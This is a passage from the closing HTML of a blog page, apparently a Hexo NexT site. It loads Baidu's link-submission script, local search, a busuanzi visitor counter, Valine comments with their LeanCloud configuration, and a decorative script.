t=document.createElement("script"),e=window.location.protocol.split(":")[0];t.src="https"===e?"https://zz.bdstatic.com/linksubmit/push.js":"http://push.zhanzhang.baidu.com/push.js";var s=document.getElementsByTagName("script")[0];s.parentNode.insertBefore(t,s)}()</script><script src="/js/local-search.js"></script><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script>NexT.utils.loadComments('#valine-comments', () => {
  NexT.utils.getScript('//cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
    new Valine(Object.assign({
      el  : '#valine-comments',
      path: location.pathname,
    }, {"enable":true,"appId":"8hPlmJu758GqGb8p9gI7IWIH-gzGzoHsz","appKey":"EBvPjdspqOEm800591erwHwx","placeholder":"ヾﾉ≧∀≦)o来了老弟!","avatar":"wavatar","meta":["nick","mail","link"],"pageSize":10,"lang":null,"visitor":true,"comment_count":true,"recordIP":false,"serverURLs":null,"enableQQ":false,"requiredFields":[]}
    ));
  }, window.Valine);
});</script><script type="text/javascript" src="/js/love.js"></script></body></html>